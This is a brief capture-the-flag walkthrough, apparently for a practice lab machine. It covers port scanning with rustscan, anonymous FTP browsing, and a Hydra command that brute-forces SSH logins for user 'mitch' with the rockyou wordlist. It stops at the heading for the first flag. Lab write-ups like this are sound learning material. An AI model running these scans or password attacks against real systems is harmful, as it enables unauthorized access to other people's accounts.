## Let's start !!

First, we set an IP variable

````````
export IP=10.10.82.18
````````

### Rustscan

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -oN nmap.txt
````````

So we have 3 ports open 21(FTP) ,80(HTTP) , 2222(ssh) . First, let's check what is in FTP... 

### FTP 

````````
ftp $IP

````````
Here we found a file called ForMitch.txt let us see what is inside. It says that mitch is the worst dev and his password is very weak.
so, We can try to brute force it...

### Hydra 

````````
hydra -l mitch -s 2222 -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 6

YESS!!! we have successfully bruteforce the password. now let's log in as user mitch via ssh...

## Getting our first flag.
